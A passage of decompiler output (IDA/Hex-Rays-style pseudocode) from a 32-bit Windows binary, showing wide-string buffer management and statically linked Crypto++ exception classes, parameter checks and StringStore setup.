      if ( a2 < 8 && (unsigned int)this[5] >= 8 )
      {
        v5 = *this;
        memmove_0(this, *this, 2 * v4 + 2);
        result = (void **)std::_Deallocate<8,0>(v5, 2 * (_DWORD)this[5] + 2);
        this[5] = (void *)7;
      }
    }
    else
    {
      LOBYTE(a2) = 0;
      result = sub_40615C(this, (unsigned int)result - v4, a2);
      this[4] = (void *)v4;
    }
  }
  return result;
}

//----- (00406033) --------------------------------------------------------
unsigned int __stdcall sub_406033(void (**a1)(void))
{
  void (**v1)(void); // esi

  v1 = a1;
  std::wstring::wstring(a1 + 1);
  v1[7]();
  _Cnd_do_broadcast_at_thread_exit();
  sub_405ED4((void **)&a1);
  return 0;
}
// 401C6C: using guessed type _DWORD __stdcall std::wstring::wstring(_DWORD);

//----- (00406089) --------------------------------------------------------
unsigned int __stdcall sub_406089(void (**Block)(void))
{
  (*Block)();
  _Cnd_do_broadcast_at_thread_exit();
  sub_42CF7C(Block);
  return 0;
}

//----- (004060C7) --------------------------------------------------------
struct std::_Facet_base *__cdecl sub_4060C7(std::locale *a1)
{
  int v1; // edi
  unsigned int v2; // eax
  struct std::_Facet_base *v3; // esi
  char v5[4]; // [esp+8h] [ebp-14h] BYREF
  struct std::_Facet_base *Block; // [esp+Ch] [ebp-10h] BYREF
  int v7; // [esp+18h] [ebp-4h]

  std::_Lockit::_Lockit((std::_Lockit *)v5, 0);
  v7 = 0;
  v1 = dword_49317C;
  Block = (struct std::_Facet_base *)dword_49317C;
  v2 = std::locale::id::operator unsigned int(&unk_491ECC);
  v3 = std::locale::_Getfacet(a1, v2);
  if ( !v3 )
  {
    if ( v1 )
    {
      v3 = (struct std::_Facet_base *)v1;
    }
    else
    {
      if ( sub_4034ED(&Block, a1) == -1 )
        sub_402BD9();
      v3 = Block;
      LOBYTE(v7) = 1;
      std::_Facet_Register(Block);
      (*(void (__thiscall **)(struct std::_Facet_base *))(*(_DWORD *)v3 + 4))(v3);
      dword_49317C = (int)v3;
    }
  }
  std::_Lockit::~_Lockit((std::_Lockit *)v5);
  return v3;
}
// 402BD9: using guessed type void __noreturn sub_402BD9(void);
// 403269: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 49317C: using guessed type int dword_49317C;
// 4060C7: using guessed type char var_14[4];

//----- (0040615C) --------------------------------------------------------
void **__thiscall sub_40615C(void **Src, unsigned int a2, int a3)
{
  char *v4; // ecx
  char *v5; // edi
  unsigned int v6; // esi
  void *v7; // eax
  void *v8; // esi
  int v10; // [esp-Ch] [ebp-20h]
  size_t v11; // [esp-4h] [ebp-18h]
  void *v12; // [esp+Ch] [ebp-8h]
  char *v13; // [esp+10h] [ebp-4h]
  unsigned int v14; // [esp+1Ch] [ebp+8h]

  v4 = (char *)Src[4];
  v13 = v4;
  if ( 2147483646 - (int)v4 < a2 )
    sub_40278D();
  v5 = &v4[a2];
  v10 = (int)&v4[a2];
  v14 = (unsigned int)Src[5];
  v6 = sub_402798(v10, v14, 0x7FFFFFFEu);
  v7 = (void *)std::allocator<wchar_t>::allocate(v6 + 1);
  Src[4] = v5;
  v12 = v7;
  Src[5] = (void *)v6;
  v11 = 2 * (_DWORD)v13 + 2;
  if ( v14 < 8 )
  {
    memmove_0(v7, Src, v11);
  }
  else
  {
    v8 = *Src;
    memmove_0(v7, *Src, v11);
    std::_Deallocate<8,0>(v8, 2 * v14 + 2);
  }
  *Src = v12;
  return Src;
}
// 402086: using guessed type _DWORD __stdcall std::allocator<wchar_t>::allocate(_DWORD);
// 40278D: using guessed type void __noreturn sub_40278D(void);

//----- (0040621B) --------------------------------------------------------
char *__thiscall sub_40621B(char *this, char a2)
{
  return sub_405052(&this[-*((_DWORD *)this - 1)], a2);
}

//----- (00406223) --------------------------------------------------------
int __stdcall sub_406223(char a1)
{
  return std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`scalar deleting destructor'(a1);
}
// 40502A: using guessed type _DWORD __stdcall std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`scalar deleting destructor'(char);

//----- (0040622B) --------------------------------------------------------
int __fastcall sub_40622B(void *a1, size_t Size, void *Src, size_t Sizea)
{
  int *v6; // eax
  int v7; // [esp-8h] [ebp-10h]

  if ( !Sizea )
    return 0;
  if ( !a1 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 22;
  }
  if ( Src && Size >= Sizea )
  {
    memmove_0(a1, Src, Sizea);
    return 0;
  }
  memset(a1, 0, Size);
  if ( !Src )
  {
    v6 = _errno();
    v7 = 22;
LABEL_12:
    *v6 = v7;
    _invalid_parameter_noinfo();
    return v7;
  }
  if ( Size < Sizea )
  {
    v6 = _errno();
    v7 = 34;
    goto LABEL_12;
  }
  return 22;
}

//----- (004062C6) --------------------------------------------------------
bool __thiscall sub_4062C6(char *this, int a2)
{
  return __std_type_info_compare(this + 4, a2 + 4) != 0;
}
// 44416A: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);

//----- (004062E4) --------------------------------------------------------
int __thiscall sub_4062E4(_DWORD *this)
{
  *this = &CryptoPP::Exception::`vftable';
  unknown_libname_5(this + 4);
  *this = &std::exception::`vftable';
  return __std_exception_destroy(this + 1);
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 444120: using guessed type _DWORD __cdecl __std_exception_destroy(_DWORD);
// 46B44C: using guessed type void *std::exception::`vftable';
// 46B458: using guessed type void *CryptoPP::Exception::`vftable';

//----- (00406307) --------------------------------------------------------
_DWORD *__thiscall sub_406307(_DWORD *this, int a2, _DWORD *Src)
{
  _DWORD *v4; // ecx

  this[1] = 0;
  this[2] = 0;
  v4 = this + 4;
  *this = &CryptoPP::Exception::`vftable';
  this[3] = a2;
  v4[4] = 0;
  v4[5] = 0;
  sub_4055F6(v4, Src);
  return this;
}
// 46B458: using guessed type void *CryptoPP::Exception::`vftable';

//----- (00406351) --------------------------------------------------------
_DWORD *__thiscall sub_406351(_DWORD *this)
{
  _DWORD *result; // eax

  result = this + 4;
  if ( this[9] >= 0x10u )
    return (_DWORD *)*result;
  return result;
}

//----- (0040635D) --------------------------------------------------------
_DWORD *__thiscall sub_40635D(_DWORD *Block, char a2)
{
  sub_4062E4(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040637F) --------------------------------------------------------
_DWORD *__thiscall sub_40637F(_DWORD *this, _DWORD *Src)
{
  sub_406307(this, 1, Src);
  *this = &CryptoPP::InvalidArgument::`vftable';
  return this;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';

//----- (004063A5) --------------------------------------------------------
_DWORD *__thiscall sub_4063A5(_DWORD *this, _DWORD *Src)
{
  sub_406307(this, 0, Src);
  *this = &CryptoPP::NotImplemented::`vftable';
  return this;
}
// 46B470: using guessed type void *CryptoPP::NotImplemented::`vftable';

//----- (004063C6) --------------------------------------------------------
_DWORD *__thiscall sub_4063C6(_DWORD *this, _DWORD *Src)
{
  sub_406307(this, 2, Src);
  *this = &CryptoPP::CannotFlush::`vftable';
  return this;
}
// 46C44C: using guessed type void *CryptoPP::CannotFlush::`vftable';

//----- (004063E7) --------------------------------------------------------
_DWORD *__thiscall sub_4063E7(_DWORD *this, _DWORD *a2, int a3, int a4)
{
  unsigned int v5; // eax
  int v6; // eax
  void *v7; // eax
  int v8; // eax
  int v9; // eax
  void *v10; // eax
  int v11; // eax
  int v12; // eax
  _DWORD *result; // eax
  char v14[24]; // [esp+Ch] [ebp-A0h] BYREF
  char v15[24]; // [esp+24h] [ebp-88h] BYREF
  char v16[24]; // [esp+3Ch] [ebp-70h] BYREF
  char v17[24]; // [esp+54h] [ebp-58h] BYREF
  _DWORD Src[6]; // [esp+6Ch] [ebp-40h] BYREF
  _DWORD v19[6]; // [esp+84h] [ebp-28h] BYREF
  int v20; // [esp+9Ch] [ebp-10h]
  int v21; // [esp+A8h] [ebp-4h]

  v20 = 0;
  v21 = 0;
  v19[4] = 0;
  LOBYTE(v19[0]) = 0;
  v5 = a2[4] + 35;
  v19[5] = 15;
  v20 = 1;
  sub_4093D7(v19, v5);
  unknown_libname_13("NameValuePairs: type mismatch for '");
  std::string::append(a2);
  v6 = unknown_libname_13("', stored '");
  std::string::string(v6);
  v20 = 3;
  LOBYTE(v21) = 1;
  v7 = (void *)__std_type_info_name(a3 + 4, &stru_492448);
  v8 = unknown_libname_13(v7);
  std::string::string(v8);
  v20 = 7;
  LOBYTE(v21) = 2;
  v9 = unknown_libname_13("', trying to retrieve '");
  std::string::string(v9);
  v20 = 15;
  LOBYTE(v21) = 3;
  v10 = (void *)__std_type_info_name(a4 + 4, &stru_492448);
  v11 = unknown_libname_13(v10);
  std::string::string(v11);
  v20 = 31;
  LOBYTE(v21) = 4;
  v12 = unknown_libname_13(&unk_47ECC0);
  std::string::string(v12);
  v20 = 63;
  LOBYTE(v21) = 5;
  sub_406307(this, 1, Src);
  *this = &CryptoPP::InvalidArgument::`vftable';
  unknown_libname_5(Src);
  unknown_libname_5(v17);
  unknown_libname_5(v16);
  unknown_libname_5(v15);
  unknown_libname_5(v14);
  unknown_libname_5(v19);
  result = this;
  this[10] = a3;
  this[11] = a4;
  *this = &CryptoPP::NameValuePairs::ValueTypeMismatch::`vftable';
  return result;
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 404F75: using guessed type _DWORD __stdcall std::string::string(_DWORD);
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 46C458: using guessed type void *CryptoPP::NameValuePairs::ValueTypeMismatch::`vftable';
// 4063E7: using guessed type char var_A0[24];
// 4063E7: using guessed type char var_88[24];
// 4063E7: using guessed type char var_70[24];
// 4063E7: using guessed type char var_58[24];
// 4063E7: using guessed type _DWORD Src[6];

//----- (00406577) --------------------------------------------------------
bool __cdecl sub_406577(void *Src, char *a2, int a3)
{
  bool result; // al
  _DWORD pExceptionObject[12]; // [esp+0h] [ebp-54h] BYREF
  _DWORD v5[9]; // [esp+30h] [ebp-24h] BYREF

  result = sub_4062C6(a2, a3);
  if ( result )
  {
    sub_404FA6(v5, Src);
    v5[8] = 0;
    sub_4063E7(pExceptionObject, v5, (int)a2, a3);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__);
  }
  return result;
}
// 406577: using guessed type _DWORD pExceptionObject[12];

//----- (004065CF) --------------------------------------------------------
_DWORD *__thiscall sub_4065CF(_DWORD *Block, char a2)
{
  sub_4062E4(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (004065F1) --------------------------------------------------------
std::exception *__thiscall sub_4065F1(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::NameValuePairs::ValueTypeMismatch::`vftable';
  *((_DWORD *)this + 10) = *((_DWORD *)a2 + 10);
  *((_DWORD *)this + 11) = *((_DWORD *)a2 + 11);
  return this;
}
// 46C458: using guessed type void *CryptoPP::NameValuePairs::ValueTypeMismatch::`vftable';

//----- (0040661F) --------------------------------------------------------
std::exception *__thiscall sub_40661F(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::InvalidArgument::`vftable';
  return this;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';

//----- (0040663E) --------------------------------------------------------
std::exception *__thiscall sub_40663E(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &CryptoPP::Exception::`vftable';
  *((_DWORD *)this + 3) = *((_DWORD *)a2 + 3);
  *((_DWORD *)this + 8) = 0;
  *((_DWORD *)this + 9) = 0;
  sub_4055F6((_DWORD *)this + 4, (_DWORD *)a2 + 4);
  return this;
}
// 46B458: using guessed type void *CryptoPP::Exception::`vftable';

//----- (0040668E) --------------------------------------------------------
void __noreturn sub_40668E()
{
  _DWORD pExceptionObject[10]; // [esp+0h] [ebp-4Ch] BYREF
  _DWORD Src[9]; // [esp+28h] [ebp-24h] BYREF

  sub_404FA6(Src, "Clone() is not implemented yet.");
  Src[8] = 0;
  sub_4063A5(pExceptionObject, Src);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 40668E: using guessed type void __noreturn sub_40668E();
// 40668E: using guessed type _DWORD pExceptionObject[10];

//----- (004066C7) --------------------------------------------------------
std::exception *__thiscall sub_4066C7(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::NotImplemented::`vftable';
  return this;
}
// 46B470: using guessed type void *CryptoPP::NotImplemented::`vftable';

//----- (004066E6) --------------------------------------------------------
int __stdcall sub_4066E6(int a1)
{
  *(_DWORD *)(a1 + 16) = 0;
  *(_DWORD *)(a1 + 20) = 15;
  *(_BYTE *)a1 = 0;
  unknown_libname_15("unknown");
  return a1;
}

//----- (0040670E) --------------------------------------------------------
bool __thiscall sub_40670E(void *this, int a2)
{
  return a2 == (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 16))(this, a2);
}

//----- (00406723) --------------------------------------------------------
int __thiscall sub_406723(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 32))(this);
}

//----- (00406728) --------------------------------------------------------
void __thiscall __noreturn sub_406728(void *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  _DWORD pExceptionObject[10]; // [esp+0h] [ebp-64h] BYREF
  char v4[32]; // [esp+40h] [ebp-24h] BYREF
  int v5; // [esp+60h] [ebp-4h]

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
  (*(void (__thiscall **)(int, char *))(*(_DWORD *)v1 + 8))(v1, v4);
  v5 = 0;
  v2 = (_DWORD *)sub_40960F(": this object doesn't support resynchronization");
  LOBYTE(v5) = 1;
  sub_4063A5(pExceptionObject, v2);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 406728: using guessed type char var_24[32];
// 406728: using guessed type _DWORD pExceptionObject[10];

//----- (00406775) --------------------------------------------------------
char sub_406775()
{
  return 0;
}

//----- (00406778) --------------------------------------------------------
void __noreturn sub_406778()
{
  _DWORD pExceptionObject[10]; // [esp+0h] [ebp-4Ch] BYREF
  _DWORD Src[9]; // [esp+28h] [ebp-24h] BYREF

  sub_404FA6(Src, "StreamTransformation: this object doesn't support random access");
  Src[8] = 0;
  sub_4063A5(pExceptionObject, Src);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 406778: using guessed type void __noreturn sub_406778();
// 406778: using guessed type _DWORD pExceptionObject[10];

//----- (004067B1) --------------------------------------------------------
int __thiscall sub_4067B1(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 28))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 56))(this, a2, v4);
}

//----- (004067CC) --------------------------------------------------------
int __thiscall sub_4067CC(void *this, int a2, int a3, int a4)
{
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a3, a4);
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 20))(this, a2);
}

//----- (004067EC) --------------------------------------------------------
int __thiscall sub_4067EC(int *this, int a2)
{
  int v3; // esi
  int v4; // eax

  v3 = *this;
  v4 = (*(int (__thiscall **)(int *))(*this + 28))(this);
  return (*(int (__thiscall **)(int *, int, int))(v3 + 64))(this, a2, v4);
}

//----- (00406807) --------------------------------------------------------
int __thiscall sub_406807(void *this, int a2, int a3, int a4)
{
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a3, a4);
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 48))(this, a2);
}

//----- (00406827) --------------------------------------------------------
int __thiscall sub_406827(void *this, int a2, int a3, int a4, int a5)
{
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a4, a5);
  return (*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 56))(this, a2, a3);
}

//----- (0040684A) --------------------------------------------------------
int __thiscall sub_40684A(void *this, int a2, int a3, int a4, int a5)
{
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a4, a5);
  return (*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 64))(this, a2, a3);
}

//----- (0040686D) --------------------------------------------------------
char *__thiscall sub_40686D(char *this)
{
  return this + 4;
}

//----- (00406871) --------------------------------------------------------
int __stdcall sub_406871(_DWORD *a1)
{
  *a1 = 0;
  return 0;
}

//----- (00406880) --------------------------------------------------------
int __thiscall sub_406880(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this);
}

//----- (00406889) --------------------------------------------------------
char __stdcall sub_406889(int a1)
{
  return 0;
}

//----- (0040688E) --------------------------------------------------------
int __thiscall sub_40688E(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 92))(this);
}

//----- (00406893) --------------------------------------------------------
int __thiscall sub_406893(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 164))(this);
}

//----- (0040689B) --------------------------------------------------------
void __noreturn sub_40689B()
{
  _DWORD pExceptionObject[10]; // [esp+0h] [ebp-4Ch] BYREF
  _DWORD Src[9]; // [esp+28h] [ebp-24h] BYREF

  sub_404FA6(Src, "BufferedTransformation: this object is not attachable");
  Src[8] = 0;
  sub_4063A5(pExceptionObject, Src);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 40689B: using guessed type void __noreturn sub_40689B();
// 40689B: using guessed type _DWORD pExceptionObject[10];

//----- (004068D4) --------------------------------------------------------
_DWORD *__thiscall sub_4068D4(_DWORD *this, _DWORD *Src)
{
  sub_406307(this, 4, Src);
  *this = &CryptoPP::CryptoMaterial::InvalidMaterial::`vftable';
  return this;
}
// 46CE30: using guessed type void *CryptoPP::CryptoMaterial::InvalidMaterial::`vftable';

//----- (004068F5) --------------------------------------------------------
int __thiscall sub_4068F5(void *this, int a2, int a3)
{
  int result; // eax
  _DWORD pExceptionObject[10]; // [esp+0h] [ebp-4Ch] BYREF
  _DWORD Src[9]; // [esp+28h] [ebp-24h] BYREF

  result = (*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 12))(this, a2, a3);
  if ( !(_BYTE)result )
  {
    sub_404FA6(Src, "CryptoMaterial: this object contains invalid values");
    Src[8] = 0;
    sub_4068D4(pExceptionObject, Src);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVInvalidMaterial_CryptoMaterial_CryptoPP__);
  }
  return result;
}
// 4068F5: using guessed type _DWORD pExceptionObject[10];

//----- (0040694B) --------------------------------------------------------
void __noreturn sub_40694B()
{
  _DWORD pExceptionObject[10]; // [esp+0h] [ebp-4Ch] BYREF
  _DWORD Src[9]; // [esp+28h] [ebp-24h] BYREF

  sub_404FA6(Src, "CryptoMaterial: this object does not support precomputation");
  Src[8] = 0;
  sub_4063A5(pExceptionObject, Src);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVNotImplemented_CryptoPP__);
}
// 40694B: using guessed type void __noreturn sub_40694B();
// 40694B: using guessed type _DWORD pExceptionObject[10];

//----- (00406984) --------------------------------------------------------
std::exception *__thiscall sub_406984(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::CryptoMaterial::InvalidMaterial::`vftable';
  return this;
}
// 46CE30: using guessed type void *CryptoPP::CryptoMaterial::InvalidMaterial::`vftable';

//----- (004069A3) --------------------------------------------------------
std::exception *__thiscall sub_4069A3(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::InvalidDataFormat::`vftable';
  return this;
}
// 46C434: using guessed type void *CryptoPP::InvalidDataFormat::`vftable';

//----- (004069C2) --------------------------------------------------------
int __thiscall sub_4069C2(void *this)
{
  int v1; // edx

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 20))(this);
  return v1 + *(_DWORD *)(*(_DWORD *)v1 + 4);
}

//----- (004069D1) --------------------------------------------------------
int __thiscall sub_4069D1(void *this)
{
  int v1; // edx

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this);
  return v1 + *(_DWORD *)(*(_DWORD *)v1 + 4);
}

//----- (004069E0) --------------------------------------------------------
int __thiscall sub_4069E0(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 8))(this);
}

//----- (004069E9) --------------------------------------------------------
int sub_4069E9()
{
  return 4;
}

//----- (004069ED) --------------------------------------------------------
int __thiscall sub_4069ED(_BYTE *this)
{
  int v1; // eax

  v1 = *(_DWORD *)this;
  this[16] = 0;
  return (*(int (**)(void))(v1 + 176))();
}

//----- (004069FD) --------------------------------------------------------
BOOL __thiscall sub_4069FD(_BYTE *this)
{
  return this[16] == 0;
}

//----- (00406A06) --------------------------------------------------------
int __stdcall sub_406A06(int a1, _DWORD *a2, int a3, int a4)
{
  *a2 = 0;
  a2[1] = 0;
  return 0;
}

//----- (00406A19) --------------------------------------------------------
int __stdcall sub_406A19(int a1, int a2, int a3, int a4, int a5, int a6)
{
  return 0;
}

//----- (00406A1E) --------------------------------------------------------
void __thiscall sub_406A1E(void *this)
{
  sub_40891D((int)this + 4);
}

//----- (00406A26) --------------------------------------------------------
_DWORD *__thiscall sub_406A26(_DWORD *this, char *Src, char a3)
{
  int v4; // edx

  v4 = 0;
  *(_BYTE *)this = 0;
  this[1] = 0;
  this[2] = 0;
  this[4] = -1;
  this[5] = 0;
  this[6] = 0;
  if ( Src )
    v4 = strlen(Src);
  sub_406AC9(this, Src, v4, a3);
  return this;
}

//----- (00406A82) --------------------------------------------------------
_DWORD *__thiscall sub_406A82(_DWORD *this, void *Src, int Size, char a4)
{
  *(_BYTE *)this = 0;
  this[1] = 0;
  this[2] = 0;
  this[4] = -1;
  this[5] = 0;
  this[6] = 0;
  sub_406AC9(this, Src, Size, a4);
  return this;
}

//----- (00406AC9) --------------------------------------------------------
void *__thiscall sub_406AC9(_DWORD *this, void *Src, int Size, char a4)
{
  void *result; // eax

  if ( a4 )
  {
    result = sub_4089B9(this + 3, Src, Size);
  }
  else
  {
    this[1] = Src;
    result = (void *)Size;
    this[2] = Size;
  }
  *(_BYTE *)this = a4;
  return result;
}

//----- (00406AFD) --------------------------------------------------------
_DWORD *__thiscall sub_406AFD(_DWORD *this, void *a2)
{
  int v3; // eax
  int v4; // eax
  _DWORD *result; // eax
  char v6[24]; // [esp+4h] [ebp-58h] BYREF
  _DWORD Src[6]; // [esp+1Ch] [ebp-40h] BYREF
  char v8[16]; // [esp+34h] [ebp-28h] BYREF
  int v9; // [esp+44h] [ebp-18h]
  int v10; // [esp+48h] [ebp-14h]
  _DWORD *v11; // [esp+4Ch] [ebp-10h]
  int v12; // [esp+58h] [ebp-4h]

  v9 = 0;
  v10 = 15;
  v11 = this;
  v8[0] = 0;
  unknown_libname_15("AlgorithmParametersBase: parameter \"");
  v12 = 2;
  v3 = unknown_libname_13(a2);
  std::string::string(v3);
  v4 = unknown_libname_13("\" not used");
  std::string::string(v4);
  sub_406307(this, 6, Src);
  unknown_libname_5(Src);
  unknown_libname_5(v6);
  unknown_libname_5(v8);
  result = this;
  *this = &CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable';
  return result;
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 404F75: using guessed type _DWORD __stdcall std::string::string(_DWORD);
// 46C618: using guessed type void *CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable';
// 406AFD: using guessed type char var_28[16];
// 406AFD: using guessed type char var_58[24];
// 406AFD: using guessed type _DWORD Src[6];

//----- (00406B9E) --------------------------------------------------------
int __thiscall sub_406B9E(void **this)
{
  _DWORD pExceptionObject[14]; // [esp+4h] [ebp-38h] BYREF

  pExceptionObject[10] = this;
  *this = &CryptoPP::AlgorithmParametersBase::`vftable';
  pExceptionObject[13] = 0;
  if ( !j____uncaught_exceptions() && *((_BYTE *)this + 8) && !*((_BYTE *)this + 9) )
  {
    sub_406AFD(pExceptionObject, this[1]);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVParameterNotUsed_AlgorithmParametersBase_CryptoPP__);
  }
  return sub_40967A(this + 3);
}
// 42BBF8: using guessed type int j____uncaught_exceptions(void);
// 46C624: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';

//----- (00406BFD) --------------------------------------------------------
_DWORD *__thiscall sub_406BFD(_DWORD *this, int a2)
{
  _DWORD *v3; // ecx
  _DWORD *result; // eax
  int v5; // [esp-4h] [ebp-1Ch]

  *this = &CryptoPP::AlgorithmParametersBase::`vftable';
  v3 = this + 3;
  this[1] = *(_DWORD *)(a2 + 4);
  *((_BYTE *)this + 8) = *(_BYTE *)(a2 + 8);
  *((_BYTE *)this + 9) = *(_BYTE *)(a2 + 9);
  *v3 = 0;
  v5 = *(_DWORD *)(a2 + 12);
  *(_DWORD *)(a2 + 12) = 0;
  sub_4096AA(v3, v5);
  result = this;
  *(_BYTE *)(a2 + 9) = 1;
  return result;
}
// 46C624: using guessed type void *CryptoPP::AlgorithmParametersBase::`vftable';

//----- (00406C56) --------------------------------------------------------
void **__thiscall sub_406C56(void **Block, char a2)
{
  sub_406B9E(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00406C78) --------------------------------------------------------
std::exception *__thiscall sub_406C78(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable';
  return this;
}
// 46C618: using guessed type void *CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable';

//----- (00406C9F) --------------------------------------------------------
int __thiscall sub_406C9F(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 4))(this[2]);
}

//----- (00406CA7) --------------------------------------------------------
int __thiscall sub_406CA7(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 8))(this[2]);
}

//----- (00406CAF) --------------------------------------------------------
int __thiscall sub_406CAF(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 12))(this[2]);
}

//----- (00406CB7) --------------------------------------------------------
int __thiscall sub_406CB7(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 16))(this[2]);
}

//----- (00406CC3) --------------------------------------------------------
int __thiscall sub_406CC3(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 20))(this[2]);
}

//----- (00406CCF) --------------------------------------------------------
int __thiscall sub_406CCF(_DWORD *this)
{
  return (*(int (__thiscall **)(int))(*(_DWORD *)(this[1] + 4) + 20))(this[1] + 4);
}

//----- (00406CDA) --------------------------------------------------------
int __thiscall sub_406CDA(_DWORD *this)
{
  return this[5];
}

//----- (00406CDE) --------------------------------------------------------
_DWORD *__thiscall sub_406CDE(_DWORD *this)
{
  sub_40CAC3(this + 1, 1);
  this[2] = 0;
  this[4] = -1;
  this[5] = 0;
  this[6] = 0;
  return this;
}

//----- (00406D06) --------------------------------------------------------
int __thiscall sub_406D06(_DWORD *this, int a2)
{
  int result; // eax
  _DWORD pExceptionObject[10]; // [esp+0h] [ebp-4Ch] BYREF
  _DWORD Src[9]; // [esp+28h] [ebp-24h] BYREF

  result = a2;
  if ( a2 )
  {
    if ( a2 != this[5] )
    {
      sub_404FA6(Src, "CipherModeBase: feedback size cannot be specified for this cipher mode");
      Src[8] = 0;
      sub_40637F(pExceptionObject, Src);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
    }
  }
  return result;
}
// 406D06: using guessed type _DWORD pExceptionObject[10];

//----- (00406D59) --------------------------------------------------------
void __thiscall sub_406D59(int this)
{
  unsigned int v2; // ecx
  void *v3; // edx

  v2 = *(_DWORD *)(this + 36);
  v3 = *(void **)(this + 40);
  if ( *(_DWORD *)(this + 32) < v2 )
    v2 = *(_DWORD *)(this + 32);
  memset(*(void **)(this + 40), 0, v2);
  j_j___free_base(v3);
  sub_408954(this + 12);
}

//----- (00406DA9) --------------------------------------------------------
int __thiscall sub_406DA9(_DWORD *this)
{
  return this[4];
}

//----- (00406DAD) --------------------------------------------------------
int __thiscall sub_406DAD(_DWORD *this)
{
  return (*(int (__thiscall **)(int))(*(_DWORD *)(this[1] + 4) + 28))(this[1] + 4);
}

//----- (00406DB8) --------------------------------------------------------
int __thiscall sub_406DB8(int this, void *Src, int a3)
{
  int v4; // eax

  v4 = sub_40DCBA((int *)this, a3);
  return sub_40622B(*(void **)(this + 24), *(_DWORD *)(this + 20), Src, v4);
}

//----- (00406DDC) --------------------------------------------------------
int sub_406DDC()
{
  return 2;
}

//----- (00406DE8) --------------------------------------------------------
_DWORD *__thiscall sub_406DE8(_DWORD *this, char *Src)
{
  _DWORD *v3; // eax
  int *v4; // eax
  _DWORD v6[7]; // [esp+8h] [ebp-34h] BYREF
  void **v7; // [esp+24h] [ebp-18h] BYREF
  int v8; // [esp+28h] [ebp-14h] BYREF
  int v9; // [esp+38h] [ebp-4h]

  sub_40CAC3(this, 0);
  this[3] = -1;
  *((_BYTE *)this + 16) = 0;
  *this = &CryptoPP::StringStore::`vftable';
  this[1] = &CryptoPP::StringStore::`vftable';
  v3 = sub_406A26(v6, Src, 0);
  v9 = 0;
  v4 = (int *)sub_4096C6((char *)&v7, (int)"InputBuffer", (int)v3, 1);
